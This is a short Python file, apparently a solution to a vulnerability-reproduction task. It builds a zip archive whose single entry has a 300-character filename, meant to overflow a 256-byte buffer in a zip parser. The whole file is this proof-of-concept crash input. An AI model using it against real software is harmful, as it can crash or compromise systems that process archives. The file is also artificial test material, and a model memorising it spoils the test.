import os
import zipfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a filename longer than 256 bytes
        # The vulnerability is triggered when filename > 256 chars
        filename = "A" * 300  # 300 chars to ensure overflow beyond 256-byte buffer
        
        # Create in-memory zip file
        buffer = io.BytesIO()
        
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Create a minimal file content (just a small string)
            content = b"vulnerable"
            
            # Create ZipInfo with our long filename
            zip_info = zipfile.ZipInfo(filename)
            zip_info.compress_type = zipfile.ZIP_DEFLATED
            
            # Add file to zip
            zf.writestr(zip_info, content)
        
        # Return the entire zip file as bytes
        buffer.seek(0)
        return buffer.read()